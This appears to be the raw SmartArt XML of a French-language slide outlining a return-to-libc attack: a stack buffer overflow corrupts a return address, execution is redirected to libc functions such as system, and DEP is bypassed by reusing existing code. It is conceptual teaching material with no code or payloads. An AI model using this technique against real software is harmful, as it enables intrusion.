    <dgm:cxn modelId="{60E416A0-1FF2-654A-9BEB-7C8B6D5C9CB7}" type="presOf" srcId="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" destId="{B3478384-6979-444B-845B-EB78AD96AA85}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{B51578BB-E632-4CC9-8303-78CE15A067C3}" srcId="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" destId="{543F8BEE-4FC1-4C32-A420-3C730513CD8C}" srcOrd="0" destOrd="0" parTransId="{7B3043BC-3FE6-4AB3-AB3C-584A1A9FDDE7}" sibTransId="{468D8CB9-AC12-4EA6-9D9E-DC04133E7E44}"/>
    <dgm:cxn modelId="{CB0551C8-8DF4-E74C-85DA-8E4029E07BAF}" type="presOf" srcId="{1F317220-9E0F-403B-9227-154E8BE916B4}" destId="{C7FA961D-A5FC-174E-B189-F518A9C26F4E}" srcOrd="1" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{6EA1FBF7-3D13-48AD-9D88-1A1FC6EB8D35}" srcId="{543F8BEE-4FC1-4C32-A420-3C730513CD8C}" destId="{36EC3767-E807-4E78-B463-E581F750A17B}" srcOrd="1" destOrd="0" parTransId="{F476B247-192F-4B66-A8B1-48F513B00C72}" sibTransId="{49CCA11E-5164-4C2D-9C83-9A5D776C8FCF}"/>
    <dgm:cxn modelId="{8046BCF8-34CD-E64A-8A27-DA5F4AEF25AD}" type="presParOf" srcId="{B3478384-6979-444B-845B-EB78AD96AA85}" destId="{B51E74BC-7665-AA4A-9F53-3D750D1E81BD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{A2AC211E-E833-784F-8114-D326CC995CB2}" type="presParOf" srcId="{B3478384-6979-444B-845B-EB78AD96AA85}" destId="{5D48E36C-F0C2-8440-B362-77306D726176}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{23DC4F9D-1326-6D4D-A9AD-3D35135FF4F1}" type="presParOf" srcId="{B3478384-6979-444B-845B-EB78AD96AA85}" destId="{79D77F75-AE2F-B247-93FB-F1EA6A36604B}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{21D96EE7-9D6A-7E49-BEDA-AD762814A5F1}" type="presParOf" srcId="{B3478384-6979-444B-845B-EB78AD96AA85}" destId="{E390C19A-D785-BB48-A164-B71F7F8E3549}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{F0C2E032-2BC0-404C-BDA5-7205FAFB23CC}" type="presParOf" srcId="{B3478384-6979-444B-845B-EB78AD96AA85}" destId="{C7FA961D-A5FC-174E-B189-F518A9C26F4E}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{3CCEC063-B97F-E14B-BCE9-91A512B9B007}" type="presParOf" srcId="{B3478384-6979-444B-845B-EB78AD96AA85}" destId="{771523E3-4E65-3F42-B934-74A896B95EB4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5FCF4CA2-FCA6-4482-A353-46B93BD8DF6A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F5EC41C-58A4-4909-88B9-FA42900E1CB0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Vulnérabilité utilisée :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Dépassement de tampon sur la pile.</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Cela permet de corrompre la valeur de retour d'une fonction pour rediriger l'exécution.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{20CB5FE5-633B-4F65-9FB1-E20C04533D78}" type="parTrans" cxnId="{FC81FC30-011D-4EE2-95AF-C583973931C1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E2F25A66-148D-4189-8082-390E9C7DBF6E}" type="sibTrans" cxnId="{FC81FC30-011D-4EE2-95AF-C583973931C1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0E3F5F85-E40D-4A30-BFF7-542233C52035}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Utilisation de la libc :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4116050B-7628-415F-ACCD-5B740745CB6E}" type="parTrans" cxnId="{41FFF85E-0843-45E2-AC1E-09AEAD977262}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC077020-76C0-441E-B518-B053A09BE021}" type="sibTrans" cxnId="{41FFF85E-0843-45E2-AC1E-09AEAD977262}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0744AC48-2293-4EED-9FC8-4057CA23CD02}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>La bibliothèque libc contient des fonctions utiles comme system, execve, ou exit.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C48E64D7-C4D9-44F1-9916-DF20D8C832A0}" type="parTrans" cxnId="{777C6D73-0C95-4F55-BC0E-4EF291376062}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{45CFCF55-943B-4FBF-8DF3-155FF28FE3F1}" type="sibTrans" cxnId="{777C6D73-0C95-4F55-BC0E-4EF291376062}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{295F3C57-19E3-472E-9E7C-BC0A471581B9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>L'attaquant redirige le flux vers ces fonctions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{728B4E6C-F100-44C1-9653-CA7898BD09F8}" type="parTrans" cxnId="{473A36D6-99CD-4557-B10F-A43C98B7CD7A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{26FA541F-3145-4C49-A2D3-482F5FFE02D2}" type="sibTrans" cxnId="{473A36D6-99CD-4557-B10F-A43C98B7CD7A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Contournement de DEP :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DE7935E2-BD96-40B1-B217-85239AB4644A}" type="parTrans" cxnId="{D232C625-D9E8-436C-80C0-28809AEB77EC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D14A70FA-B174-41D4-9D53-FDD943B38F36}" type="sibTrans" cxnId="{D232C625-D9E8-436C-80C0-28809AEB77EC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B6DFB597-9A74-4B5A-8C8B-19595DB28619}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Pas besoin d'injecter du code.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E90657A2-4CC8-408E-96DA-B7A31877C1F9}" type="parTrans" cxnId="{68CCF463-EBEE-4A3C-8DEA-AA3FA8DADFD0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6DB4519A-D612-43E0-9B33-CA77EBFCC7F3}" type="sibTrans" cxnId="{68CCF463-EBEE-4A3C-8DEA-AA3FA8DADFD0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FC0D4423-5BDF-4778-96B8-2343B0CA2C56}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>On réutilise du code existant en mémoire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E3D1FCCC-E17A-47AA-9ACF-BA0C3EC71D1E}" type="parTrans" cxnId="{40CEA354-2918-48B1-854A-6FBF583462FD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0F01C053-866E-42B7-B5DF-F43A97460BAD}" type="sibTrans" cxnId="{40CEA354-2918-48B1-854A-6FBF583462FD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0EB493C8-75CB-6F41-9721-D532B3C4B574}" type="pres">
      <dgm:prSet presAssocID="{5FCF4CA2-FCA6-4482-A353-46B93BD8DF6A}" presName="Name0" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9BF7AB9C-C5B4-1444-9698-D995E7D15B0C}" type="pres">
      <dgm:prSet presAssocID="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" presName="boxAndChildren" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{857BD711-52BB-C547-B9CB-58DAA0CDB748}" type="pres">
      <dgm:prSet presAssocID="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" presName="parentTextBox" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A813B847-F044-294A-85C3-7C62CB9A1924}" type="pres">
      <dgm:prSet presAssocID="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" presName="entireBox" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4C3E521F-ED53-CF46-93DF-80D5965EB807}" type="pres">
      <dgm:prSet presAssocID="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" presName="descendantBox" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{506B24C4-4A52-5A46-A21A-FBB1F3C8CDBF}" type="pres">
      <dgm:prSet presAssocID="{B6DFB597-9A74-4B5A-8C8B-19595DB28619}" presName="childTextBox" presStyleLbl="fgAccFollowNode1" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{67E1DE26-058E-FA49-A77A-3164EB68274D}" type="pres">
      <dgm:prSet presAssocID="{FC0D4423-5BDF-4778-96B8-2343B0CA2C56}" presName="childTextBox" presStyleLbl="fgAccFollowNode1" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{94BEB67A-B39C-EC43-9612-897943462D4B}" type="pres">
      <dgm:prSet presAssocID="{BC077020-76C0-441E-B518-B053A09BE021}" presName="sp" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{ED1D528C-D526-254B-A1BF-19CA804360E8}" type="pres">
      <dgm:prSet presAssocID="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" presName="arrowAndChildren" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{ECCE9965-2350-D84F-8214-886EAA606278}" type="pres">
      <dgm:prSet presAssocID="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" presName="parentTextArrow" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{088E40BD-1977-7C49-862C-453566EEF453}" type="pres">
      <dgm:prSet presAssocID="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" presName="arrow" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7230594D-FAB1-2049-BF3B-600E975D9231}" type="pres">
      <dgm:prSet presAssocID="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" presName="descendantArrow" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EC94485D-BB52-7E4E-B6D4-2492D170D08B}" type="pres">
      <dgm:prSet presAssocID="{0744AC48-2293-4EED-9FC8-4057CA23CD02}" presName="childTextArrow" presStyleLbl="fgAccFollowNode1" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{78354798-D776-E84D-A6E1-905DD9A8EE85}" type="pres">
      <dgm:prSet presAssocID="{295F3C57-19E3-472E-9E7C-BC0A471581B9}" presName="childTextArrow" presStyleLbl="fgAccFollowNode1" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8D23BCD-04F3-5042-8649-031C8CDBAB54}" type="pres">
      <dgm:prSet presAssocID="{E2F25A66-148D-4189-8082-390E9C7DBF6E}" presName="sp" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{362C15B8-01C5-1147-92FE-C2C542608EF4}" type="pres">
      <dgm:prSet presAssocID="{BF5EC41C-58A4-4909-88B9-FA42900E1CB0}" presName="arrowAndChildren" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{68C3A1E4-41B5-8243-B8DC-C6C8706868C7}" type="pres">
      <dgm:prSet presAssocID="{BF5EC41C-58A4-4909-88B9-FA42900E1CB0}" presName="parentTextArrow" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{D232C625-D9E8-436C-80C0-28809AEB77EC}" srcId="{5FCF4CA2-FCA6-4482-A353-46B93BD8DF6A}" destId="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" srcOrd="2" destOrd="0" parTransId="{DE7935E2-BD96-40B1-B217-85239AB4644A}" sibTransId="{D14A70FA-B174-41D4-9D53-FDD943B38F36}"/>
    <dgm:cxn modelId="{FC81FC30-011D-4EE2-95AF-C583973931C1}" srcId="{5FCF4CA2-FCA6-4482-A353-46B93BD8DF6A}" destId="{BF5EC41C-58A4-4909-88B9-FA42900E1CB0}" srcOrd="0" destOrd="0" parTransId="{20CB5FE5-633B-4F65-9FB1-E20C04533D78}" sibTransId="{E2F25A66-148D-4189-8082-390E9C7DBF6E}"/>
    <dgm:cxn modelId="{AE8E344C-8C37-1749-A98C-B753B3953FE4}" type="presOf" srcId="{B6DFB597-9A74-4B5A-8C8B-19595DB28619}" destId="{506B24C4-4A52-5A46-A21A-FBB1F3C8CDBF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{40CEA354-2918-48B1-854A-6FBF583462FD}" srcId="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" destId="{FC0D4423-5BDF-4778-96B8-2343B0CA2C56}" srcOrd="1" destOrd="0" parTransId="{E3D1FCCC-E17A-47AA-9ACF-BA0C3EC71D1E}" sibTransId="{0F01C053-866E-42B7-B5DF-F43A97460BAD}"/>
    <dgm:cxn modelId="{6F82EB59-0324-C44B-AA41-E5DF8F29B633}" type="presOf" srcId="{0744AC48-2293-4EED-9FC8-4057CA23CD02}" destId="{EC94485D-BB52-7E4E-B6D4-2492D170D08B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{41FFF85E-0843-45E2-AC1E-09AEAD977262}" srcId="{5FCF4CA2-FCA6-4482-A353-46B93BD8DF6A}" destId="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" srcOrd="1" destOrd="0" parTransId="{4116050B-7628-415F-ACCD-5B740745CB6E}" sibTransId="{BC077020-76C0-441E-B518-B053A09BE021}"/>
    <dgm:cxn modelId="{68CCF463-EBEE-4A3C-8DEA-AA3FA8DADFD0}" srcId="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" destId="{B6DFB597-9A74-4B5A-8C8B-19595DB28619}" srcOrd="0" destOrd="0" parTransId="{E90657A2-4CC8-408E-96DA-B7A31877C1F9}" sibTransId="{6DB4519A-D612-43E0-9B33-CA77EBFCC7F3}"/>
    <dgm:cxn modelId="{E7BE9665-BE39-EE4C-B702-2800D9792F78}" type="presOf" srcId="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" destId="{ECCE9965-2350-D84F-8214-886EAA606278}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{777C6D73-0C95-4F55-BC0E-4EF291376062}" srcId="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" destId="{0744AC48-2293-4EED-9FC8-4057CA23CD02}" srcOrd="0" destOrd="0" parTransId="{C48E64D7-C4D9-44F1-9916-DF20D8C832A0}" sibTransId="{45CFCF55-943B-4FBF-8DF3-155FF28FE3F1}"/>
    <dgm:cxn modelId="{7137E781-C215-E443-AE5E-E5E193F253A0}" type="presOf" srcId="{5FCF4CA2-FCA6-4482-A353-46B93BD8DF6A}" destId="{0EB493C8-75CB-6F41-9721-D532B3C4B574}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{F2923E83-E6E9-8746-9454-5FE32B7F7008}" type="presOf" srcId="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" destId="{857BD711-52BB-C547-B9CB-58DAA0CDB748}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{5ED70A99-E6A0-2348-AACE-C54072CDC485}" type="presOf" srcId="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" destId="{088E40BD-1977-7C49-862C-453566EEF453}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{AB1E079C-48FA-4647-9AD2-EA9261D04902}" type="presOf" srcId="{295F3C57-19E3-472E-9E7C-BC0A471581B9}" destId="{78354798-D776-E84D-A6E1-905DD9A8EE85}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{B9C44ABD-C646-F744-834E-E4BA1D9CBD3A}" type="presOf" srcId="{EAB7683E-62AC-4064-A9D1-CFA586E64FEE}" destId="{A813B847-F044-294A-85C3-7C62CB9A1924}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{473A36D6-99CD-4557-B10F-A43C98B7CD7A}" srcId="{0E3F5F85-E40D-4A30-BFF7-542233C52035}" destId="{295F3C57-19E3-472E-9E7C-BC0A471581B9}" srcOrd="1" destOrd="0" parTransId="{728B4E6C-F100-44C1-9653-CA7898BD09F8}" sibTransId="{26FA541F-3145-4C49-A2D3-482F5FFE02D2}"/>
    <dgm:cxn modelId="{031F08E4-DC6F-874B-8AB6-6C485057C12D}" type="presOf" srcId="{BF5EC41C-58A4-4909-88B9-FA42900E1CB0}" destId="{68C3A1E4-41B5-8243-B8DC-C6C8706868C7}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{0970BBFE-FCC6-284E-B081-297E38C55D90}" type="presOf" srcId="{FC0D4423-5BDF-4778-96B8-2343B0CA2C56}" destId="{67E1DE26-058E-FA49-A77A-3164EB68274D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{6D369F67-DF9F-8D46-963E-5005FE1BDBF5}" type="presParOf" srcId="{0EB493C8-75CB-6F41-9721-D532B3C4B574}" destId="{9BF7AB9C-C5B4-1444-9698-D995E7D15B0C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{3B9F7B66-E92B-A948-B0C3-F641383B49F8}" type="presParOf" srcId="{9BF7AB9C-C5B4-1444-9698-D995E7D15B0C}" destId="{857BD711-52BB-C547-B9CB-58DAA0CDB748}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{2C59E472-DEBE-8A48-8850-FA28DF18FFCB}" type="presParOf" srcId="{9BF7AB9C-C5B4-1444-9698-D995E7D15B0C}" destId="{A813B847-F044-294A-85C3-7C62CB9A1924}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{95571178-9717-3A48-A19F-600073744282}" type="presParOf" srcId="{9BF7AB9C-C5B4-1444-9698-D995E7D15B0C}" destId="{4C3E521F-ED53-CF46-93DF-80D5965EB807}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{6FCABBCE-D236-B94B-8315-310BAA0DD91A}" type="presParOf" srcId="{4C3E521F-ED53-CF46-93DF-80D5965EB807}" destId="{506B24C4-4A52-5A46-A21A-FBB1F3C8CDBF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{FBCC3412-E49C-624D-B84D-8BE3663D3A48}" type="presParOf" srcId="{4C3E521F-ED53-CF46-93DF-80D5965EB807}" destId="{67E1DE26-058E-FA49-A77A-3164EB68274D}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{FC81D84E-E9D1-5F4C-8590-1F5A81DF16FF}" type="presParOf" srcId="{0EB493C8-75CB-6F41-9721-D532B3C4B574}" destId="{94BEB67A-B39C-EC43-9612-897943462D4B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{F1440F38-FEAB-9047-9FEC-04371448C3AB}" type="presParOf" srcId="{0EB493C8-75CB-6F41-9721-D532B3C4B574}" destId="{ED1D528C-D526-254B-A1BF-19CA804360E8}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{2D768DCD-1DA1-4C45-9A23-C8DD78BE0B13}" type="presParOf" srcId="{ED1D528C-D526-254B-A1BF-19CA804360E8}" destId="{ECCE9965-2350-D84F-8214-886EAA606278}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{DF9285C9-D647-3949-8D86-DE0633258354}" type="presParOf" srcId="{ED1D528C-D526-254B-A1BF-19CA804360E8}" destId="{088E40BD-1977-7C49-862C-453566EEF453}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{CE073DB0-9E47-0B4B-B6E5-7FF41AC48569}" type="presParOf" srcId="{ED1D528C-D526-254B-A1BF-19CA804360E8}" destId="{7230594D-FAB1-2049-BF3B-600E975D9231}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{9B83714B-595A-2742-85FD-B475A994F2E0}" type="presParOf" srcId="{7230594D-FAB1-2049-BF3B-600E975D9231}" destId="{EC94485D-BB52-7E4E-B6D4-2492D170D08B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{79A4F9AA-DE21-2140-8989-00C58FE60F55}" type="presParOf" srcId="{7230594D-FAB1-2049-BF3B-600E975D9231}" destId="{78354798-D776-E84D-A6E1-905DD9A8EE85}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{7C0633B0-8158-EE47-B33E-07660F6A28C7}" type="presParOf" srcId="{0EB493C8-75CB-6F41-9721-D532B3C4B574}" destId="{B8D23BCD-04F3-5042-8649-031C8CDBAB54}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{7AEDDC24-2EB4-5142-B1B6-95454929CD1F}" type="presParOf" srcId="{0EB493C8-75CB-6F41-9721-D532B3C4B574}" destId="{362C15B8-01C5-1147-92FE-C2C542608EF4}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/process4"/>
    <dgm:cxn modelId="{E0AA0D30-5395-8A4B-882C-D03587CC4C35}" type="presParOf" srcId="{362C15B8-01C5-1147-92FE-C2C542608EF4}" destId="{68C3A1E4-41B5-8243-B8DC-C6C8706868C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D67971B6-3817-4FA2-9270-F51FD5582BB9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76F2B87-85E8-415A-BC46-08DF77D0B429}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Protection mémoire Windows :Empêche l'exécution de code dans les segments non marqués comme exécutables (ex. : pile).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5E559F2A-301B-4560-A7A5-01A6B9067A44}" type="parTrans" cxnId="{C6D61F56-2589-4D36-BCA7-9424BC6087BC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
